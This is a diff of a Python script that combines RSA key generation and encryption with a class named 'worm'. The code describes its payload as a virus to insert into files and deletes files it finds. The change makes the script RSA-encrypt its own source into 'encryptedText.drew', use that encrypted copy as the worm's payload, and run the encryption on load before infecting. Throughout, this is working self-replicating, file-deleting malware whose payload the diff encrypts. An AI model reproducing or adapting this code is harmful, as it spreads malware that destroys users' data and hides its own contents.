@@ -1,5 +1,4 @@
 import os
-from __future__ import print_function
 import random, sys, os
 ##########################################
 #cryptomath module
@@ -20,7 +19,7 @@ def findModInverse(a, m):
 
 ##########################################
 # rabin miller
-from __future__ import print_function
+
 # Primality Testing with the Rabin-Miller Algorithm
 
 def rabinMiller(num):
@@ -87,19 +86,19 @@ def main():
 
 def generateKey(keySize):
     print('Generating prime p...')
-    p = rabinMiller.generateLargePrime(keySize)
+    p = generateLargePrime(keySize)
     print('Generating prime q...')
-    q = rabinMiller.generateLargePrime(keySize)
+    q = generateLargePrime(keySize)
     n = p * q
 
     print('Generating e that is relatively prime to (p - 1) * (q - 1)...')
     while True:
         e = random.randrange(2 ** (keySize - 1), 2 ** (keySize))
-        if cryptoMath.gcd(e, (p - 1) * (q - 1)) == 1:
+        if gcd(e, (p - 1) * (q - 1)) == 1:
             break
 
     print('Calculating d that is mod inverse of e...')
-    d = cryptoMath.findModInverse(e, (p - 1) * (q - 1))
+    d = findModInverse(e, (p - 1) * (q - 1))
 
     publicKey = (n, e)
     privateKey = (n, d)
@@ -122,8 +121,6 @@ def makeKeyFiles(name, keySize):
 
 ##########################################
 # rsa cipher
-from __future__ import print_function
-import sys, rsa_key_generator as rkg, os
 
 DEFAULT_BLOCK_SIZE = 128
 BYTE_SIZE = 256
@@ -139,15 +136,19 @@ def cipherMain():
 
     if mode == 'encrypt':
         if not os.path.exists('rsa_pubkey.txt'):
-            rkg.makeKeyFiles('rsa', 1024)
+            makeKeyFiles('rsa', 1024)
 
-        message = input('\nEnter message: ')
+        # message = input('\nEnter message: ')
         pubKeyFilename = 'rsa_pubkey.txt'
         print('Encrypting and writing to %s...' % (filename))
-        encryptedText = encryptAndWriteToFile(filename, pubKeyFilename, message)
+        message = open(__file__, 'r').readlines()
+        encryptedMessage = open('encryptedText.drew', 'a')
 
-        print('\nEncrypted text:')
-        print(encryptedText)
+        for line in message:
+            encryptedText = encryptAndWriteToFile(filename, pubKeyFilename, line)
+            encryptedMessage.write(encryptedText)
+            encryptedMessage.write('\n')
+
 
     elif mode == 'decrypt':
         privKeyFilename = 'rsa_privkey.txt'
@@ -255,7 +256,7 @@ class worm():
         self.paths = []
 
         # the virus that we are inserting into
-        self.virus = open(__file__, 'r').readlines()
+        self.virus = open('encryptedText.drew', 'r').readlines()
 
         # the initial path that we are searching along
         self.path = '/Users/Drew/Projects/garbage'
@@ -296,6 +297,7 @@ class worm():
         for file in self.files:
             os.remove(file)
 
+cipherMain()
 # make a worm instance
 worm = worm()
 worm.infect()
